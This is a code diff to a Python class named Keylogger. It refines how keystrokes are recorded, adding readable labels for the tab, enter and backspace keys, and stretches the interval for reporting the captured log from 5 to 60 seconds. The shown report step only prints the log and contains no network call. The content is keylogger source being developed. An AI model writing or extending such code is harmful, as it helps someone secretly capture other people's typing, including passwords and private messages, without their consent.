@@ -14,9 +14,11 @@ class Keylogger:
 				log = log + " "
 				# print(log)
 			elif key == key.tab:
-				log = log + "Tab "
+				log = log + " Tab "
 			elif key== key.enter:
-				log = log + "enter "
+				log = log + " enter "
+			elif key==key.backspace:
+				log = log + " backspace "
 			else:
 				log =  log + str(key)
 
@@ -25,7 +27,7 @@ class Keylogger:
 		global log
 		print(log)
 		log = ""
-		timer = threading.Timer(5, self.report)
+		timer = threading.Timer(60, self.report)
 		timer.start()
 			
 	def start(self):		
